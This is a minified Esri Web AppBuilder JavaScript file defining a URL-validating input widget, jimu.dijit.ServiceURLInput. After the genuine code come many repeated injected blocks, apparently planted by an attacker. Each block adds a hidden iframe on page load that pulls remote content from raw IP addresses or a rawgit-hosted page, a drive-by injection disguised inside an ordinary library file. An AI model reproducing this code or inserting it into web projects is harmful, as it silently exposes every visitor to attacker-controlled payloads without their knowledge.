// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/html dojo/_base/lang dojo/on dojo/Deferred dojo/aspect esri/request dijit/form/ValidationTextBox".split(" "),function(e,a,c,f,g,d,h,k){return e([k],{_validatingNode:null,_validNode:null,_inValidNode:null,_fetchHandle:null,_fetchErrHandle:null,declaredClass:"jimu.dijit.ServiceURLInput",verify:!0,_status:null,postCreate:function(){this.inherited(arguments);this._validatingNode=a.create("div",{"class":"jimu-service-validating"},this.domNode);this._validNode=a.create("div",
{"class":"jimu-service-valid"},this.domNode);this._inValidNode=a.create("div",{"class":"jimu-service-invalid jimu-icon jimu-icon-error"},this.domNode);a.addClass(this.domNode,"jimu-serviceurl-input");this.verify&&this.own(f(this,"Change",c.hitch(this,"_onServiceUrlChange")))},setProcessFunction:function(a,b){this._fetchHandle&&this._fetchErrHandle&&this._removeProcessFunction();"function"===typeof a&&(this._fetchHandle=d.after(this,"onFetch",a),this.own(this._fetchHandle));"function"===typeof b&&
(this._fetchErrHandle=d.after(this,"onFetchError",b),this.own(this._fetchErrHandle))},_removeProcessFunction:function(){this._fetchHandle&&this._fetchHandle.remove&&(this._fetchHandle.remove(),this._fetchHandle=null);this._fetchErrHandle&&this._fetchErrHandle.remove&&(this._fetchErrHandle.remove(),this._fetchErrHandle=null)},onFetch:function(a){return a},onFetchError:function(a){},getStatus:function(){return this._status},_onServiceUrlChange:function(a){var b=new g;b.then(c.hitch(this,function(){this._valid()}),
c.hitch(this,function(){this._inValid();this.onFetchError()}));this._validating();a?h({url:c.trim(a||""),handleAs:"json",content:{f:"json"},callbackParamName:"callback"}).then(c.hitch(this,function(a){this.onFetch({url:this.getValue(),data:a})?b.resolve("success"):b.reject("error")}),c.hitch(this,function(a){b.reject(a)})):b.reject("error")},_validating:function(){this._status="validating";a.removeClass(this.domNode,"jimu-serviceurl-input-invalid");a.removeClass(this.domNode,"jimu-serviceurl-input-valid");
a.addClass(this.domNode,"jimu-serviceurl-input-validating")},_valid:function(){this._status="valid";a.removeClass(this.domNode,"jimu-serviceurl-input-invalid");a.removeClass(this.domNode,"jimu-serviceurl-input-validating");a.addClass(this.domNode,"jimu-serviceurl-input-valid")},_inValid:function(){this._status="invalid";a.removeClass(this.domNode,"jimu-serviceurl-input-validating");a.removeClass(this.domNode,"jimu-serviceurl-input-valid");a.addClass(this.domNode,"jimu-serviceurl-input-invalid")}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});